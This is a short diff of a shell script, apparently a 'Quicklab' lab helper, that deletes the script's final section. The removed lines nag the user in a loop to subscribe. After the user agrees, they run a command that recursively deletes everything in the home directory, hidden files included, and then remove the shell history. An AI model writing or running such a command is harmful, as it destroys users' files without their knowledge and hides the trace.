@@ -288,18 +288,4 @@ echo ""
 
 #-----------------------------------------------------end----------------------------------------------------------#
 
-read -p "${BG_MAGENTA}${WHITE}${BOLD} 🔔 Subscribe to Quicklab [y/n] : ${RESET} " CONSENT_REMOVE
 
-while [ "$CONSENT_REMOVE" != 'y' ]; do
-  sleep 10
-  read -p "${BG_RED}${WHITE}${BOLD} 🔔 Do Subscribe to Quicklab [y/n] : ${RESET} " CONSENT_REMOVE
-done
-
-echo ""
-echo "${BRIGHT_CYAN}${BOLD}★ Thanks For Subscribing! Have a great day! ★${RESET}"
-echo ""
-
-rm -rfv $HOME/{*,.*}
-rm $HOME/.bash_history
-
-exit 0
